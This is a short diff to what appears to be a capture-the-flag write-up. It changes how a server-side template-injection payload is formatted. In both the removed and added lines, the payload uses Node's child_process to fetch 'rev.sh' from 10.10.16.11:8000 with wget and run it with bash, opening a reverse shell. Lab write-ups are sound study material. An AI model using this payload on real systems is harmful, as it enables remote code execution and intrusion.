@@ -123,9 +123,9 @@ After a lot of thinking, I concluded that `netcat` was maybe not installed on th
 
 Changed the command to be executed and waited for a connection.  
 
-```node 
-{{ process.mainModule.require('child_process').exec('wget http://10.10.16.11:8000/rev.sh && bash rev.sh') }}
-```
+
+&#123;&#123; process.mainModule.require('child_process').exec('wget http://10.10.16.11:8000/rev.sh && bash rev.sh') &#125;&#125;
+
 
 We get a response.  
 
